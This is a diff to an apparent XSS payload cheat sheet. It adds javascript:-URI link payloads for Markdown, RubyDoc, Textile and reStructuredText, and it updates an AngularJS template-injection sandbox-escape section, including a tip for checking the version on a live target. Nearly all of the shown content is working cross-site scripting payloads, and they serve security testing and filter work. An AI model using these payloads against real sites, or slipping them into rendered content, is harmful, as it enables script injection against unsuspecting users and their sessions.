@@ -79,10 +79,46 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 **Markdown XSS**
 
 ```md
+[a](javascript:confirm(1)
+```
+
+```md
 [a](javascript://www.google.com%0Aprompt(1))
 ```
 
+```md
+[a](javascript://%0d%0aconfirm(1);com)
+```
+
+```md
+[a](javascript:window.onerror=confirm;throw%201)
+```
+
+**Lightweight Markup Languages**
+
+**RubyDoc** (.rdoc)
+
+```rdoc
+XSS[JavaScript:alert(1)]
+```
+
+**Textile** ([.textile](https://txstyle.org/))
+
+```textile
+"Test link":javascript:alert(1)
+```
+
+**reStructuredText** ([.rst](http://docutils.sourceforge.net/docs/user/rst/quickref.html))
+
+```rst
+`Test link`__.
+
+__ javascript:alert(document.domain)  
+```
+
 **AngularJS Template Injection based XSS**
+
+*For manual verification on a live target, use `angular.version` in your browser console*
 
 **1.0.1 - 1.1.5** by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)
 
@@ -205,7 +241,7 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 }}
 ```
 
-**1.6.0+** (no Sandbox) by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)
+**1.6.0+** (no [Expression Sandbox](http://angularjs.blogspot.co.uk/2016/09/angular-16-expression-sandbox-removal.html)) by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)
 
 ```js
 {{constructor.constructor('alert(1)')()}}
